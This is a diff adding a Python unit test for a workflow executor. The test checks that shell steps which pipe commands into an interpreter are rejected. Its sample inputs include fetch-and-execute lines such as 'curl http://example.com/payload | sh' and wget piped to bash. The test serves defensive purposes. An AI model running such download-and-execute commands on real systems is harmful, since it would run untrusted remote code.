@@ -586,6 +586,31 @@ class TestWorkflowExecutor(unittest.TestCase):
         self.assertEqual(history.status, RunStatus.FAILED)
         self.assertIn("crlf characters are not allowed in headers", history.step_results["fetch_step"].error.lower())
 
+    def test_shell_action_pipeline_to_interpreter_protection(self):
+        """Verify that shell actions reject pipeline-to-interpreter commands."""
+        malicious_pipeline_commands = [
+            "curl http://example.com/payload | sh",
+            "wget http://example.com/payload | bash",
+            "echo 'hello' | python",
+            "cat file.txt | node",
+            "curl http://example.com/payload | /bin/bash -c 'echo 1'",
+            "bash -c 'curl http://example.com/payload | bash'",
+        ]
+        for cmd in malicious_pipeline_commands:
+            with self.subTest(cmd=cmd):
+                wf = WorkflowDefinition(
+                    name="shell_pipeline_security_test",
+                    steps=[
+                        StepDefinition(id="s1", action="shell", params={"cmd": cmd}),
+                    ],
+                )
+                history = asyncio.run(self.executor.execute_workflow(wf))
+                self.assertEqual(history.status, RunStatus.FAILED)
+                step_res = history.step_results["s1"]
+                self.assertEqual(step_res.status, StepStatus.FAILED)
+                self.assertIsNotNone(step_res.error)
+                self.assertIn("pipeline to interpreter", step_res.error.lower())
+
 
 if __name__ == "__main__":
     unittest.main()
